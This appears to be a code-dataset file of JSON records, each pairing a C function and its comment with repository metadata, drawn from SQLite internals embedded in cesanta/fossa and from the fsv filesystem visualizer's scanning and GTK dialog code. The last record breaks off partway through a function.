{"docstring": "/*\n** Release any memory held by the Mem. This may leave the Mem in an\n** inconsistent state, for example with (Mem.z==0) and\n** (Mem.type==SQLITE_TEXT).\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeMemRelease(Mem *p)", "code": "{\n  VdbeMemRelease(p);\n  sqlite3DbFree(p->db, p->zMalloc);\n  p->z = 0;\n  p->zMalloc = 0;\n  p->xDel = 0;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Return SQLITE_LOCKED_SHAREDCACHE if another user of the same shared \n** btree as the argument handle holds an exclusive lock on the \n** sqlite_master table. Otherwise SQLITE_OK.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeSchemaLocked(Btree *p)", "code": "{\n  int rc;\n  assert( sqlite3_mutex_held(p->db->mutex) );\n  sqlite3BtreeEnter(p);\n  rc = querySharedCacheTableLock(p, MASTER_ROOT, READ_LOCK);\n  assert( rc==SQLITE_OK || rc==SQLITE_LOCKED_SHAREDCACHE );\n  sqlite3BtreeLeave(p);\n  return rc;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Return true if any register in the range iFrom..iTo (inclusive)\n** is used as part of the column cache.\n**\n** This routine is used within assert() and testcase() macros only\n** and does not appear in a normal build.\n*/\n", "func_signal": "static int usedAsColumnCache(Parse *pParse, int iFrom, int iTo)", "code": "{\n  int i;\n  struct yColCache *p;\n  for(i=0, p=pParse->aColCache; i<SQLITE_N_COLCACHE; i++, p++){\n    int r = p->iReg;\n    if( r>=iFrom && r<=iTo ) return 1;    /*NO_TEST*/\n  }\n  return 0;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** This routine sets the value to be returned by subsequent calls to\n** sqlite3_changes() on the database handle 'db'. \n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeSetChanges(sqlite3 *db, int nChange)", "code": "{\n  assert( sqlite3_mutex_held(db->mutex) );\n  db->nChange = nChange;\n  db->nTotalChange += nChange;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Return a pointer to the WalIndexHdr structure in the wal-index.\n*/\n", "func_signal": "static volatile WalIndexHdr *walIndexHdr(Wal *pWal)", "code": "{\n  assert( pWal->nWiData>0 && pWal->apWiData[0] );\n  return (volatile WalIndexHdr*)pWal->apWiData[0];\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/* \n** Test if the cell that cursor pCursor currently points to\n** would be filtered (excluded) by the constraints in the \n** pCursor->aConstraint[] array. If so, set *pbEof to true before\n** returning. If the cell is not filtered (excluded) by the constraints,\n** set pbEof to zero.\n**\n** Return SQLITE_OK if successful or an SQLite error code if an error\n** occurs within a geometry callback.\n**\n** This function assumes that the cell is part of a leaf node.\n*/\n", "func_signal": "static int testRtreeEntry(Rtree *pRtree, RtreeCursor *pCursor, int *pbEof)", "code": "{\n  RtreeCell cell;\n  int ii;\n  *pbEof = 0;\n\n  nodeGetCell(pRtree, pCursor->pNode, pCursor->iCell, &cell);\n  for(ii=0; ii<pCursor->nConstraint; ii++){\n    RtreeConstraint *p = &pCursor->aConstraint[ii];\n    RtreeDValue coord = DCOORD(cell.aCoord[p->iCoord]);\n    int res;\n    assert(p->op==RTREE_LE || p->op==RTREE_LT || p->op==RTREE_GE \n        || p->op==RTREE_GT || p->op==RTREE_EQ || p->op==RTREE_MATCH\n    );\n    switch( p->op ){\n      case RTREE_LE: res = (coord<=p->rValue); break;\n      case RTREE_LT: res = (coord<p->rValue);  break;\n      case RTREE_GE: res = (coord>=p->rValue); break;\n      case RTREE_GT: res = (coord>p->rValue);  break;\n      case RTREE_EQ: res = (coord==p->rValue); break;\n      default: {\n        int rc;\n        assert( p->op==RTREE_MATCH );\n        rc = testRtreeGeom(pRtree, p, &cell, &res);\n        if( rc!=SQLITE_OK ){\n          return rc;\n        }\n        break;\n      }\n    }\n\n    if( !res ){\n      *pbEof = 1;\n      return SQLITE_OK;\n    }\n  }\n\n  return SQLITE_OK;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** The hex() function.  Interpret the argument as a blob.  Return\n** a hexadecimal rendering as text.\n*/\n", "func_signal": "static void hexFunc(\n  sqlite3_context *context,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  int i, n;\n  const unsigned char *pBlob;\n  char *zHex, *z;\n  assert( argc==1 );\n  UNUSED_PARAMETER(argc);\n  pBlob = sqlite3_value_blob(argv[0]);\n  n = sqlite3_value_bytes(argv[0]);\n  assert( pBlob==sqlite3_value_blob(argv[0]) );  /* No encoding change */\n  z = zHex = contextMalloc(context, ((i64)n)*2 + 1);\n  if( zHex ){\n    for(i=0; i<n; i++, pBlob++){\n      unsigned char c = *pBlob;\n      *(z++) = hexdigits[(c>>4)&0xf];\n      *(z++) = hexdigits[c&0xf];\n    }\n    *z = 0;\n    sqlite3_result_text(context, zHex, n*2, sqlite3_free);\n  }\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** If the pBase expression originated in the ON or USING clause of\n** a join, then transfer the appropriate markings over to derived.\n*/\n", "func_signal": "static void transferJoinMarkings(Expr *pDerived, Expr *pBase)", "code": "{\n  pDerived->flags |= pBase->flags & EP_FromJoin;\n  pDerived->iRightJoinTable = pBase->iRightJoinTable;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Free a parsed fts3 query expression allocated by sqlite3Fts3ExprParse().\n**\n** This function would be simpler if it recursively called itself. But\n** that would mean passing a sufficiently large expression to ExprParse()\n** could cause a stack overflow.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3Fts3ExprFree(Fts3Expr *pDel)", "code": "{\n  Fts3Expr *p;\n  assert( pDel==0 || pDel->pParent==0 );\n  for(p=pDel; p && (p->pLeft||p->pRight); p=(p->pLeft ? p->pLeft : p->pRight)){\n    assert( p->pParent==0 || p==p->pParent->pRight || p==p->pParent->pLeft );\n  }\n  while( p ){\n    Fts3Expr *pParent = p->pParent;\n    fts3FreeExprNode(p);\n    if( pParent && p==pParent->pLeft && pParent->pRight ){\n      p = pParent->pRight;\n      while( p && (p->pLeft || p->pRight) ){\n        assert( p==p->pParent->pRight || p==p->pParent->pLeft );\n        p = (p->pLeft ? p->pLeft : p->pRight);\n      }\n    }else{\n      p = pParent;\n    }\n  }\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Write the header information in pWal->hdr into the wal-index.\n**\n** The checksum on pWal->hdr is updated before it is written.\n*/\n", "func_signal": "static void walIndexWriteHdr(Wal *pWal)", "code": "{\n  volatile WalIndexHdr *aHdr = walIndexHdr(pWal);\n  const int nCksum = offsetof(WalIndexHdr, aCksum);\n\n  assert( pWal->writeLock );\n  pWal->hdr.isInit = 1;\n  pWal->hdr.iVersion = WALINDEX_MAX_VERSION;\n  walChecksumBytes(1, (u8*)&pWal->hdr, nCksum, 0, pWal->hdr.aCksum);\n  memcpy((void *)&aHdr[1], (void *)&pWal->hdr, sizeof(WalIndexHdr));\n  walShmBarrier(pWal);\n  memcpy((void *)&aHdr[0], (void *)&pWal->hdr, sizeof(WalIndexHdr));\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Return the filename of the database associated with a database\n** connection.\n*/\n", "func_signal": "SQLITE_API const char *sqlite3_db_filename(sqlite3 *db, const char *zDbName)", "code": "{\n  Btree *pBt = sqlite3DbNameToBtree(db, zDbName);\n  return pBt ? sqlite3BtreeGetFilename(pBt) : 0;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Return a pointer to an sqlite3_value structure containing the value bound\n** parameter iVar of VM v. Except, if the value is an SQL NULL, return \n** 0 instead. Unless it is NULL, apply affinity aff (one of the SQLITE_AFF_*\n** constants) to the value before returning it.\n**\n** The returned value must be freed by the caller using sqlite3ValueFree().\n*/\n", "func_signal": "SQLITE_PRIVATE sqlite3_value *sqlite3VdbeGetValue(Vdbe *v, int iVar, u8 aff)", "code": "{\n  assert( iVar>0 );\n  if( v ){\n    Mem *pMem = &v->aVar[iVar-1];\n    if( 0==(pMem->flags & MEM_Null) ){\n      sqlite3_value *pRet = sqlite3ValueNew(v->db);\n      if( pRet ){\n        sqlite3VdbeMemCopy((Mem *)pRet, pMem);\n        sqlite3ValueApplyAffinity(pRet, aff, SQLITE_UTF8);\n        sqlite3VdbeMemStoreType((Mem *)pRet);\n      }\n      return pRet;\n    }\n  }\n  return 0;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Generate the text of a WHERE expression which can be used to select all\n** tables that have foreign key constraints that refer to table pTab (i.e.\n** constraints for which pTab is the parent table) from the sqlite_master\n** table.\n*/\n", "func_signal": "static char *whereForeignKeys(Parse *pParse, Table *pTab)", "code": "{\n  FKey *p;\n  char *zWhere = 0;\n  for(p=sqlite3FkReferences(pTab); p; p=p->pNextTo){\n    zWhere = whereOrName(pParse->db, zWhere, p->pFrom->zName);\n  }\n  return zWhere;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Delete any previous value and set the value of pMem to be an\n** empty boolean index.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeMemSetRowSet(Mem *pMem)", "code": "{\n  sqlite3 *db = pMem->db;\n  assert( db!=0 );\n  assert( (pMem->flags & MEM_RowSet)==0 );\n  sqlite3VdbeMemRelease(pMem);\n  pMem->zMalloc = sqlite3DbMallocRaw(db, 64);\n  if( db->mallocFailed ){\n    pMem->flags = MEM_Null;\n  }else{\n    assert( pMem->zMalloc );\n    pMem->u.pRowSet = sqlite3RowSetInit(db, pMem->zMalloc, \n                                       sqlite3DbMallocSize(db, pMem->zMalloc));\n    assert( pMem->u.pRowSet!=0 );\n    pMem->flags = MEM_RowSet;\n  }\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/* \n** Use nodeAcquire() to obtain the leaf node containing the record with \n** rowid iRowid. If successful, set *ppLeaf to point to the node and\n** return SQLITE_OK. If there is no such record in the table, set\n** *ppLeaf to 0 and return SQLITE_OK. If an error occurs, set *ppLeaf\n** to zero and return an SQLite error code.\n*/\n", "func_signal": "static int findLeafNode(Rtree *pRtree, i64 iRowid, RtreeNode **ppLeaf)", "code": "{\n  int rc;\n  *ppLeaf = 0;\n  sqlite3_bind_int64(pRtree->pReadRowid, 1, iRowid);\n  if( sqlite3_step(pRtree->pReadRowid)==SQLITE_ROW ){\n    i64 iNode = sqlite3_column_int64(pRtree->pReadRowid, 0);\n    rc = nodeAcquire(pRtree, iNode, 0, ppLeaf);\n    sqlite3_reset(pRtree->pReadRowid);\n  }else{\n    rc = sqlite3_reset(pRtree->pReadRowid);\n  }\n  return rc;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Assign VdbeCursor index numbers to all tables in a SrcList\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3SrcListAssignCursors(Parse *pParse, SrcList *pList)", "code": "{\n  int i;\n  struct SrcList_item *pItem;\n  assert(pList || pParse->db->mallocFailed );\n  if( pList ){\n    for(i=0, pItem=pList->a; i<pList->nSrc; i++, pItem++){\n      if( pItem->iCursor>=0 ) break;\n      pItem->iCursor = pParse->nTab++;\n      if( pItem->pSelect ){\n        sqlite3SrcListAssignCursors(pParse, pItem->pSelect->pSrc);\n      }\n    }\n  }\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Implementation of xRollback(). Discard the contents of the pending-terms\n** hash-table. Any changes made to the database are reverted by SQLite.\n*/\n", "func_signal": "static int fts3RollbackMethod(sqlite3_vtab *pVtab)", "code": "{\n  Fts3Table *p = (Fts3Table*)pVtab;\n  sqlite3Fts3PendingTermsClear(p);\n  assert( p->inTransaction!=0 );\n  TESTONLY( p->inTransaction = 0 );\n  TESTONLY( p->mxSavepoint = -1; );\n  return SQLITE_OK;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/* Selector function for use with scandir( ). This lets through all\n * directory entries except for \".\" and \"..\" */\n", "func_signal": "static int\nde_select( const struct dirent *de )", "code": "{\n\tif (de->d_name[0] != '.')\n\t\treturn 1; /* Allow \"whatever\" */\n\tif (de->d_name[1] == '\\0')\n\t\treturn 0; /* Disallow \".\" */\n\tif (de->d_name[1] != '.')\n\t\treturn 1; /* Allow \".whatever\" */\n\tif (de->d_name[2] == '\\0')\n\t\treturn 0; /* Disallow \"..\" */\n\n\t/* Allow \"..whatever\", \"...whatever\", etc. */\n\treturn 1;\n}", "path": "src\\scanfs.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Helper function for spectrum_option_menu_cb( ). This enables or\n * disables the color picker buttons as necessary */\n", "func_signal": "static void\ncsdialog_time_color_picker_set_access( boolean enabled )", "code": "{\n\tRGBcolor disabled_color;\n\tRGBcolor *color;\n\tGdkColor *gcolor;\n\n\tgtk_widget_set_sensitive( csdialog.time.old_colorpicker_w, enabled );\n\tgtk_widget_set_sensitive( csdialog.time.new_colorpicker_w, enabled );\n\n\t/* Change the color pickers' colors, as simply enabling/disabling\n\t * them isn't enough to make the state change obvious */\n\tif (enabled) {\n\t\tcolor = &csdialog.color_config.by_timestamp.old_color;\n\t\tgui_colorpicker_set_color( csdialog.time.old_colorpicker_w, color );\n\t\tcolor = &csdialog.color_config.by_timestamp.new_color;\n\t\tgui_colorpicker_set_color( csdialog.time.new_colorpicker_w, color );\n\t}\n\telse {\n\t\tgcolor = &csdialog.time.old_colorpicker_w->style->bg[GTK_STATE_NORMAL];\n\t\tdisabled_color.r = (float)gcolor->red / 65535.0;\n\t\tdisabled_color.g = (float)gcolor->green / 65535.0;\n\t\tdisabled_color.b = (float)gcolor->blue / 65535.0;\n\t\tgui_colorpicker_set_color( csdialog.time.old_colorpicker_w, &disabled_color );\n\t\tgui_colorpicker_set_color( csdialog.time.new_colorpicker_w, &disabled_color );\n\t}\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Dynamic scan progress readout */\n", "func_signal": "static boolean\nscan_monitor( void )", "code": "{\n\tchar strbuf[64];\n\n\t/* Running totals in file list area */\n\tfilelist_scan_monitor( node_counts, size_counts );\n\n\t/* Stats-per-second readout in left statusbar */\n\tsprintf( strbuf, _(\"%d stats/sec\"), 1000 * stat_count / SCAN_MONITOR_PERIOD );\n\twindow_statusbar( SB_LEFT, strbuf );\n\tgui_update( );\n\tstat_count = 0;\n\n\treturn TRUE;\n}", "path": "src\\scanfs.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the \"OK\" button */\n", "func_signal": "static void\ncsdialog_ok_button_cb( GtkWidget *unused, GtkWidget *window_w )", "code": "{\n\tColorMode mode;\n\n\t/* Commit new color configuration, and set color mode to match\n\t * current notebook page */\n\tmode = (ColorMode)gtk_notebook_get_current_page( GTK_NOTEBOOK(csdialog.notebook_w) );\n\tcolor_set_config( &csdialog.color_config, mode );\n\n        /* Update option menu to reflect current color mode */\n\twindow_set_color_mode( mode );\n\n\tgtk_widget_destroy( window_w );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the color selection dialog popped up by clicking on a\n * color bar in the wildcard pattern list */\n", "func_signal": "static void\ncsdialog_wpattern_color_selection_cb( RGBcolor *selected_color, RGBcolor *wpattern_color )", "code": "{\n\t/* wpattern_color points to the appropriate color record\n\t * somewhere inside csdialog.color_config.by_wpattern */\n\twpattern_color->r = selected_color->r;\n\twpattern_color->g = selected_color->g;\n\twpattern_color->b = selected_color->b;\n\n\t/* Update the list */\n\tcsdialog_wpattern_clist_populate( );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the date edit widgets on the \"By date/time\" page */\n", "func_signal": "static void\ncsdialog_time_edit_cb( GtkWidget *dateedit_w )", "code": "{\n\ttime_t old_time, new_time;\n\ttime_t cur_time;\n\n\told_time = gui_dateedit_get_time( csdialog.time.old_dateedit_w );\n\tnew_time = gui_dateedit_get_time( csdialog.time.new_dateedit_w );\n\tcur_time = time( NULL );\n\n\t/* Check that neither time is in the future */\n\tif (difftime( cur_time, new_time ) < 0.0)\n\t\tnew_time = cur_time;\n\tif (difftime( cur_time, old_time ) < 0.0)\n\t\told_time = cur_time;\n\n\t/* Check that old time is at least one minute before new time */\n\tif (difftime( new_time, old_time ) < 60.0) {\n\t\tif (dateedit_w == csdialog.time.old_dateedit_w)\n\t\t\tnew_time = old_time + (time_t)60;\n\t\telse if (dateedit_w == csdialog.time.new_dateedit_w)\n\t\t\told_time = new_time - (time_t)60;\n\t\telse {\n\t\t\tg_assert_not_reached( );\n\t\t\treturn;\n\t\t}\n\t}\n\n\t/* Reset old and new times */\n\tgtk_signal_handler_block_by_func( GTK_OBJECT(csdialog.time.old_dateedit_w), csdialog_time_edit_cb, NULL );\n\tgtk_signal_handler_block_by_func( GTK_OBJECT(csdialog.time.new_dateedit_w), csdialog_time_edit_cb, NULL );\n\tgui_dateedit_set_time( csdialog.time.old_dateedit_w, old_time );\n\tgui_dateedit_set_time( csdialog.time.new_dateedit_w, new_time );\n\tgtk_signal_handler_unblock_by_func( GTK_OBJECT(csdialog.time.old_dateedit_w), csdialog_time_edit_cb, NULL );\n\tgtk_signal_handler_unblock_by_func( GTK_OBJECT(csdialog.time.new_dateedit_w), csdialog_time_edit_cb, NULL );\n\n\tcsdialog.color_config.by_timestamp.old_time = old_time;\n\tcsdialog.color_config.by_timestamp.new_time = new_time;\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the OK button */\n", "func_signal": "static void\nchange_root_cb( const char *dir )", "code": "{\n\tif (globals.fsv_mode != FSV_SPLASH)\n\t\tfsv_load( dir );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Top-level call to recursively scan a filesystem */\n", "func_signal": "void\nscanfs( const char *dir )", "code": "{\n\tconst char *root_dir;\n        GNode **node_table;\n\tguint handler_id;\n\tchar *name;\n\n\tif (globals.fstree != NULL) {\n\t\t/* Free existing geometry and filesystem tree */\n\t\tgeometry_free_recursive( globals.fstree );\n\t\tg_node_destroy( globals.fstree );\n\t\t/* General memory cleanup */\n\t\tg_blow_chunks( );\n\t}\n\n\t/* Set up memory chunks to hold descriptor structs */\n\tif (ndesc_memchunk == NULL)\n\t\tndesc_memchunk = g_mem_chunk_create( NodeDesc, 64, G_ALLOC_ONLY );\n\telse\n\t\tg_mem_chunk_reset( ndesc_memchunk );\n\tif (dir_ndesc_memchunk == NULL)\n\t\tdir_ndesc_memchunk = g_mem_chunk_create( DirNodeDesc, 16, G_ALLOC_ONLY );\n\telse\n\t\tg_mem_chunk_reset( dir_ndesc_memchunk );\n\n\t/* ...and string chunks to hold name strings */\n\tif (name_strchunk != NULL)\n\t\tg_string_chunk_free( name_strchunk );\n\tname_strchunk = g_string_chunk_new( 8192 );\n\n\t/* Clear out directory tree */\n\tdirtree_clear( );\n\n\t/* Reset node numbering */\n\tnode_id = 0;\n\n\t/* Get absolute path of desired root (top-level) directory */\n\tchdir( dir );\n\troot_dir = xgetcwd( );\n\n\t/* Set up fstree metanode */\n\tglobals.fstree = g_node_new( g_mem_chunk_alloc( dir_ndesc_memchunk ) );\n\tNODE_DESC(globals.fstree)->type = NODE_METANODE;\n\tNODE_DESC(globals.fstree)->id = node_id++;\n\tname = g_dirname( root_dir );\n\tNODE_DESC(globals.fstree)->name = g_string_chunk_insert( name_strchunk, name );\n\tg_free( name );\n\tDIR_NODE_DESC(globals.fstree)->ctnode = NULL; /* needed in dirtree_entry_new( ) */\n\tDIR_NODE_DESC(globals.fstree)->a_dlist = NULL_DLIST;\n\tDIR_NODE_DESC(globals.fstree)->b_dlist = NULL_DLIST;\n\tDIR_NODE_DESC(globals.fstree)->c_dlist = NULL_DLIST;\n\n\t/* Set up root directory node */\n\tg_node_append_data( globals.fstree, g_mem_chunk_alloc( dir_ndesc_memchunk ) );\n\t/* Note: We can now use root_dnode to refer to the node just\n\t * created (it is an alias for globals.fstree->children) */\n\tNODE_DESC(root_dnode)->id = node_id++;\n\tname = g_basename( root_dir );\n\tNODE_DESC(root_dnode)->name = g_string_chunk_insert( name_strchunk, name );\n\tDIR_NODE_DESC(root_dnode)->a_dlist = NULL_DLIST;\n\tDIR_NODE_DESC(root_dnode)->b_dlist = NULL_DLIST;\n\tDIR_NODE_DESC(root_dnode)->c_dlist = NULL_DLIST;\n\tstat_node( root_dnode );\n\tdirtree_entry_new( root_dnode );\n\n\t/* GUI stuff */\n\tfilelist_scan_monitor_init( );\n\thandler_id = gtk_timeout_add( SCAN_MONITOR_PERIOD, (GtkFunction)scan_monitor, NULL );\n\n\t/* Let the disk thrashing begin */\n\tprocess_dir( root_dir, root_dnode );\n\n\t/* GUI stuff again */\n\tgtk_timeout_remove( handler_id );\n\twindow_statusbar( SB_RIGHT, \"\" );\n\tdirtree_no_more_entries( );\n\tgui_update( );\n\n\t/* Allocate node table and perform final tree setup */\n\tnode_table = NEW_ARRAY(GNode *, node_id);\n\tsetup_fstree_recursive( globals.fstree, node_table );\n\n\t/* Pass off new node table to the viewport handler */\n\tviewport_pass_node_table( node_table );\n}", "path": "src\\scanfs.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* Callback for the wildcard pattern edit subdialog */\n", "func_signal": "static void\ncsdialog_wpattern_edit_cb( const char *input_text, struct WPListRowData *row_data )", "code": "{\n\tGList *l; /* for debugging */\n\tchar *wpattern;\n\n\t/* Trim leading/trailing whitespace in input */\n\twpattern = xstrstrip( xstrdup( input_text ) );\n\n\tif (strlen( wpattern ) == 0) {\n\t\t/* Ignore empty input */\n\t\txfree( wpattern );\n\t\treturn;\n\t}\n\n\t/* Check for duplicate pattern in group */\n\t/* (This doesn't prevent the possibility of duplicate patterns\n\t * across groups, but hey, this is better than nothing) */\n\tif (g_list_find_custom( row_data->wpgroup->wp_list, wpattern, (GCompareFunc)strcmp ) != NULL) {\n\t\t/* Yep, there's a duplicate */\n\t\txfree( wpattern );\n\t\treturn;\n\t}\n\n\tswitch (row_data->row_type) {\n\t\tcase WPLIST_WPATTERN_ROW:\n\t\t/* Update existing pattern */\n\t\tl = g_list_replace( row_data->wpgroup->wp_list, row_data->wpattern, wpattern );\n\t\tg_assert( l != NULL );\n\t\txfree( row_data->wpattern );\n\t\tbreak;\n\n\t\tcase WPLIST_NEW_WPATTERN_ROW:\n\t\t/* Add new pattern */\n\t\tG_LIST_APPEND(row_data->wpgroup->wp_list, wpattern);\n\t\tbreak;\n\n\t\tSWITCH_FAIL\n\t}\n\n\t/* Update the list */\n\tcsdialog_wpattern_clist_populate( );\n}", "path": "src\\dialog.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* This does major post-scan housekeeping on the filesystem tree. It\n * sorts everything, assigns subtree size/count information to directory\n * nodes, sets up the node table, etc. */\n", "func_signal": "static void\nsetup_fstree_recursive( GNode *node, GNode **node_table )", "code": "{\n\tGNode *child_node;\n\tint i;\n\n\t/* Assign entry in the node table */\n\tnode_table[NODE_DESC(node)->id] = node;\n\n\tif (NODE_IS_DIR(node) || NODE_IS_METANODE(node)) {\n\t\t/* Initialize subtree quantities */\n\t\tDIR_NODE_DESC(node)->subtree.size = 0;\n\t\tfor (i = 0; i < NUM_NODE_TYPES; i++)\n\t\t\tDIR_NODE_DESC(node)->subtree.counts[i] = 0;\n\n\t\t/* Recurse down */\n\t\tchild_node = node->children;\n\t\twhile (child_node != NULL) {\n\t\t\tsetup_fstree_recursive( child_node, node_table );\n\t\t\tchild_node = child_node->next;\n\t\t}\n\t}\n\n\tif (!NODE_IS_METANODE(node)) {\n\t\t/* Increment subtree quantities of parent */\n\t\tDIR_NODE_DESC(node->parent)->subtree.size += NODE_DESC(node)->size;\n\t\t++DIR_NODE_DESC(node->parent)->subtree.counts[NODE_DESC(node)->type];\n\t}\n\n\tif (NODE_IS_DIR(node)) {\n\t\t/* Sort directory contents */\n\t\tnode->children = (GNode *)g_list_sort( (GList *)node->children, (GCompareFunc)compare_node );\n\t\t/* Propagate subtree size/counts upward */\n\t\tDIR_NODE_DESC(node->parent)->subtree.size += DIR_NODE_DESC(node)->subtree.size;\n\t\tfor (i = 0; i < NUM_NODE_TYPES; i++)\n\t\t\tDIR_NODE_DESC(node->parent)->subtree.counts[i] += DIR_NODE_DESC(node)->subtree.counts[i];\n\t}\n}", "path": "src\\scanfs.c", "repo_name": "mcuelenaere/fsv", "stars": 472, "license": "lgpl-2.1", "language": "c", "size": 403}
{"docstring": "/* The Properties dialog */\n", "func_signal": "static void\ndialog_node_properties( GNode *node )", "code": "{\n\tconst struct NodeInfo *node_info;\n\tGtkWidget *window_w;\n\tGtkWidget *main_vbox_w;\n\tGtkWidget *notebook_w;\n\tGtkWidget *vbox_w;\n\tGtkWidget *table_w;\n\tGtkWidget *pixmap_w;\n\tGtkWidget *hbox_w;\n\tGtkWidget *label_w;\n\tGtkWidget *separator_w;\n\tGtkWidget *button_w;\n\tGtkWidget *vbox2_w;\n\tGtkWidget *clist_w;\n\tGtkWidget *entry_w;\n\tGNode *target_node;\n\tchar strbuf[1024];\n\tchar *proptext;\n\n\t/* Get the lowdown on the node. get_node_info( ) may cause some\n\t * disk activity, so change the cursor meanwhile (just in case) */\n\tgui_cursor( main_window_w, GDK_WATCH );\n\tgui_update( );\n\tnode_info = get_node_info( node );\n\tgui_cursor( main_window_w, GDK_X_CURSOR );\n\n\twindow_w = gui_dialog_window( _(\"Properties\"), NULL );\n\tgui_window_modalize( window_w, main_window_w );\n\tmain_vbox_w = gui_vbox_add( window_w, 5 );\n\tnotebook_w = gui_notebook_add( main_vbox_w );\n\n\t/**** \"General\" page ****/\n\n\tvbox_w = gui_vbox_add( NULL, 10 );\n\tgui_notebook_page_add( notebook_w, _(\"General\"), vbox_w );\n\ttable_w = gui_table_add( vbox_w, 6, 2, FALSE, 0 );\n\n\t/* Node type icon */\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tgui_table_attach( table_w, hbox_w, 0, 1, 0, 1 );\n\tpixmap_w = gui_pixmap_xpm_add( hbox_w, node_type_xpms[NODE_DESC(node)->type] );\n\tgui_widget_packing( pixmap_w, NO_EXPAND, NO_FILL, AT_END );\n\t/* Name */\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tlabel_w = gui_label_add( hbox_w, node_info->name );\n\tgtk_label_set_justify( GTK_LABEL(label_w), GTK_JUSTIFY_LEFT );\n\tgui_table_attach( table_w, hbox_w, 1, 2, 0, 1 );\n\n\tseparator_w = gui_separator_add( NULL );\n\tgui_table_attach( table_w, separator_w, 0, 2, 1, 2 );\n\n\t/* Labels: type, location, size, owner, group */\n        strcpy( strbuf, \"\" );\n\tstrcat( strbuf, _(\"Type:\\n\\n\") );\n\tstrcat( strbuf, _(\"Location:\\n\\n\") );\n\tif (NODE_IS_DIR(node))\n\t\tstrcat( strbuf, _(\"Total size:\\n\\n\") );\n\telse {\n\t\tstrcat( strbuf, _(\"Size:\\n\") );\n\t\tstrcat( strbuf, _(\"Allocation:\\n\\n\") );\n\t}\n\tstrcat( strbuf, _(\"Owner:\\n\") );\n\tstrcat( strbuf, _(\"Group:\") );\n\thbox_w = gui_hbox_add( NULL, 8 );\n\tlabel_w = gui_label_add( hbox_w, strbuf );\n\tgui_widget_packing( label_w, NO_EXPAND, NO_FILL, AT_END );\n\tgtk_label_set_justify( GTK_LABEL(label_w), GTK_JUSTIFY_RIGHT );\n\tgui_table_attach( table_w, hbox_w, 0, 1, 2, 3 );\n\n\tproptext = xstrdup( \"\" );\n\t/* Type */\n\tSTRRECAT(proptext, _(node_type_names[NODE_DESC(node)->type]));\n\tSTRRECAT(proptext, \"\\n\\n\");\n\t/* Location 